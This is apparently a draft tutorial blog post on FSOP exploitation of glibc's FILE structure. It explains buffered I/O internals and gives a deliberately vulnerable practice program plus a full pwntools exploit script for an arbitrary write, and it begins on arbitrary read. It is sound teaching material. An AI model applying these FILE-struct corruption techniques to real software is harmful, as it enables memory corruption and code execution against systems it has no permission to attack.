+++
date = '2026-02-10T01:01:22+07:00'
draft = true
title = 'FSOP'
+++
## FILE and the underlying \_IO\_FILE struct
FSOP or File System Oriented Programming is a class of exploitation leveraging the FILE structure to gain arbitrary read/write or even remote code execution. In order to perform this set of exploitation class we have to understand what FILE structure is and how it operate on files.

FILE or \_IO\_FILE (as defined in glibc source code) structure is a struct which handle a set of operations on a file. This structure is responsbile for handling required components in order to work with files in the operating system. Here's how the struct is defined in glibc source code:
```c
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2:24;
  /* Fallback buffer to use when malloc fails to allocate one.  */
  char _short_backupbuf[1];
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```
We can group the members of the struct into the following categories:
- Pointers for reading from file
    - `char *_IO_read_ptr` is a pointer to keep track of our position in the file
    - `char *_IO_read_end` is a pointer to the end of the file
	- `char *_IO_read_base` is a pointer to the stard of the file
- Pointers for writing to file
	- `char *_IO_write_base` is a pointer to start of the file
	- `char *_IO_write_ptr` is a pointer to keep track of our position in the file
	- `char *_IO_write_end` is a pointer to the end of the file
- Internal buffer handling
	- `char *_IO_buf_base` is a pointer to the start of internal buffer
	- `char *_IO_buf_end` is a pointer to the end of internal buffer
## How reading from file happens
If we're using `open` on a file, it will return a file descriptor pointing to the file. Internally the file descriptor that we got is not the actual file descriptor for the file in the filesystem and whenever we want to operate on the file it has to be translated first. The following picture describe this process
![alt](fd_translation.png)
Whenever we're trying to carry out operation, internally the fd that we got earlier from `open` would need to be translated. First it will try to find the corresponding file descriptor object in process file table. Then, the entry in process file table will have a pointer to an entry in global file table. Finally to actually perform the operation there will be a pointer to inode which hold the actual file in the filesystem. After performing the operation we will do context switch back to userland.
For each operation we will have to do fd translation, hunting down the inode, performing the operation loop. This would be fine for infrequent file access but if we have to do numerous amount of operations this approach would hurt the performance. To fix this problem, instead of using `open` and `read` we use `fopen` and `fread`. The difference with traditional `open` and `read` is that `fopen` and `fread` operate on a FILE object.

When we want to read from a file, in internally glibc would use a buffer. This internal buffer have the size of a page or 0x1000 bytes. Whenever we try to read from a file this internal buffer will be initiated and will be filled with the bytes from the file. The `_IO_read_ptr` is pointing to the bytes that we are about to read, `_IO_read_base` points to the start of the file, `_IO_buf_base` points to the start of the internal buffer. At the other end there will be 2 pointers, `_IO_read_end` which points to the end of the file and `_IO_buf_end` which points to the end of the internal buffer.
![alt](file_read_1.png)
Everytime we want to read from the file, we actually read from the internal buffer which holds the bytes from the file. The `_IO_read_ptr` got advances by the amount of bytes we want to read.
![alt](file_read_2.png)
When we finally read all the bytes from the buffer but it's not the *end of the file* yet, the internal buffer will be replaced with another one of the same size which hold the remaining content of the file.
![alt](file_read_3.png)
If `_IO_read_ptr` is equal to `_IO_read_end` that means we've reached the *end of the file* and there'll be nothing left to read.
![alt](file_read_4.png)
## How writing to file happens
Unsurprisingly, the write operation to file doesn't stray so far from reading from file. We still use the internal buffer where we use it like a draft where our write reside before comitted to the file.
![alt](file_write_1.png)
When we write to a file, we aren't actually directly writing to it. Internally we write to the internal buffer and eventually it will commit the write to the file.
![alt](file_write_2.png)
To commit the write we have to flush the internal buffer or completely filled it. Note that closing the file stream would call `fflush` and whatever sitting in the internal buffer will be committed to the file.
![alt](file_write_3.png)

## fread()ing into memory
It's called reading into memory because we want to abuse the `_fileno` member of `FILE` struct and set it to our `stdin` file descriptor (commonly set as 0). 
Usually, the `_fileno` member represent the file descriptor of a file that we want to read from, but if we set it to `stdin` that effectively means we're writing from `stdin` to the internal buffer.
And if we're able to control where the internal buffer located, we're achieving an arbitrary write primitive.

To perform FSOP exploit in order to read into memory the following requirements must be fulfilled:
- `_IO_buf_base` <= `_IO_buf_end`
- where `_IO_buf_end` - `_IO_buf_start` >= number of bytes to write

Take a look at the following C code
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int win_var = 0;

int main() {
  char buf[0x100];

  printf("win_var address = %p\n", &win_var);

  FILE *f = fopen("/etc/passwd", "r");

  /* directly modify FILE struct members */
  read(0, f, 0x400);

  printf("f->_IO_buf_base = %p\n", f->_IO_buf_base);
  printf("f->_IO_buf_end = %p\n", f->_IO_buf_end);
  printf("f->_fileno = %p\n", f->_fileno);
  printf("f->vtable = %p\n", f->vtable);

  fread(buf, sizeof(char), 0x40, f);

  printf("f->_IO_buf_base = %p\n", f->_IO_buf_base);
  printf("f->_IO_buf_end = %p\n", f->_IO_buf_end);
  printf("f->_fileno = %p\n", f->_fileno);

  if (win_var)
    printf("You win!\n");

  printf("Exitting...\n");
  
  return 0;
}
```
Analysis of the above source code:
- There's a variable named `win_var` that the program later tell us the address of
- `win_var` will be check to confirm whether we've successfully overwrite its content and will print "You win!" if we have
- It will open `/etc/passwd` in read mode thus opening a file stream for use
- Then we're given the ability to overwrite first 0x400 bytes memory of the file stream struct. It basically allows us to modify the `FILE` struct members
- It will call `fread` function that normally should read 0x40 bytes from the opened file stream into `buf`. Later we'll exploit this to achieve arbitrary write.

Now knowing that the program will be very generous by giving us the ability to directly modify `FILE` struct member we can use this to learn how to get arbitrary write primitive. Remember that for achieving arbitrary write through hijacking `FILE` struct members, the following requirements have to be fulfilled:
- `_IO_buf_base` <= `_IO_buf_end`
- where `_IO_buf_end` - `_IO_buf_start` >= number of bytes to write
Additionally we also have to set the `_fileno` member of `FILE` struct to `stdin` or 0

Knowing all this information we can start to plan out what payload we should send to the program. The following snippet depict how we should overwrite the `FILE` struct
```c
int _flags              	= 0

char *_IO_read_ptr      	= 0
char *_IO_read_end      	= 0
char *_IO_read_base     	= 0
char *_IO_write_base    	= 0
char *_IO_write_ptr     	= 0
char *_IO_write_end     	= 0
char *_IO_buf_base      	= win_var address
char *_IO_buf_end       	= win_var address + length

char *_IO_save_base     	= 0
char *_IO_backup_base   	= 0
char *_IO_save_end      	= 0

struct _IO_marker *_markers = 0

struct _IO_FILE *_chain     = 0

int _fileno                 = 0 (stdin)
```
Now we've planned out how we should write our payload, it's time to actually write the exploit script.

First we need a way to retrieve the address of `win_var` variable that the program gives to us
```python
p.recvuntil(b" = ")
win_var_addr = int(p.recvline().strip(), 16)
```
Then we need to write the actual payload that will overwrite the `FILE` struct members and send it to the program
```python
l = 0x40

payload = b""
payload += p64(0)   			# _flags
 
payload += p64(0)   			# _IO_read_ptr
payload += p64(0)   			# _IO_read_end
payload += p64(0)   			# _IO_read_base
payload += p64(0)   			# _IO_write_base
payload += p64(0)   			# _IO_write_ptr
payload += p64(0)   			# _IO_write_end

payload += p64(win_var_addr)    # _IO_buf_base
payload += p64(win_var_addr+l)  # _IO_buf_end

payload += p64(0)               # _IO_save_base
payload += p64(0)               # _IO_backup_base
payload += p64(0)               # _IO_save_end

payload += p64(0)               # _IO_marker

payload += p64(0)               # _IO_FILE

payload += p64(0)               # _fileno

p.send(payload)
```
Finally we can just type in anything from `stdin` to overwrite the `win_var` variable value. I found that we have to send a newline at the beginning or else the value we type in won't find its way to overwrite `win_var`
```python
p.recvlines(3)
p.sendline()
p.sendline(cyclic(l))
```
Here's the full script to exploit the program's file stream to gain arbitrary write:
```python
from pwn import *

filename = "./read_into_memory"

context.log_level = "debug"
context.arch = "amd64"
context.binary = ELF(filename)

p = process(filename)

gdbscript = """b *main+113
continue
"""

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)

p.recvuntil(b" = ")
win_var_addr = int(p.recvline().strip(), 16)

print(f"win_var_addr = {hex(win_var_addr)}")

l = 0x40

payload = b""
payload += p64(0)   			# _flags
 
payload += p64(0)   			# _IO_read_ptr
payload += p64(0)   			# _IO_read_end
payload += p64(0)   			# _IO_read_base
payload += p64(0)   			# _IO_write_base
payload += p64(0)   			# _IO_write_ptr
payload += p64(0)   			# _IO_write_end

payload += p64(win_var_addr)    # _IO_buf_base
payload += p64(win_var_addr+l)  # _IO_buf_end

payload += p64(0)               # _IO_save_base
payload += p64(0)               # _IO_backup_base
payload += p64(0)               # _IO_save_end

payload += p64(0)               # _IO_marker

payload += p64(0)               # _IO_FILE

payload += p64(0)               # _fileno

print(f"len(payload) = {len(payload)}")

p.send(payload)

target_val = p64(0xdeadbeef)

p.recvlines(3)
p.sendline()
p.sendline(target_val.ljust(l, b'\x00'))

p.interactive()
```

## fwrite()ing from memory
Writing to a file meaning we're flushing what inside the internal buffer to the file.
If we set the `_fileno` member of struct `FILE` to `stdout`, it grants us the ability read from the internal buffer.
If we're also able to decide where the internal buffer is located in memory then we've acquired an arbitrary read primitive.

To perform FSOP exploit in order to write from memory the following requirements must be fulfilled:
- `_IO_read_end` == `_IO_write_base`
- `_IO_write_base` <= `_IO_write_ptr`
- where `_IO_write_ptr` - `_IO_write_base` >= number of bytes to read

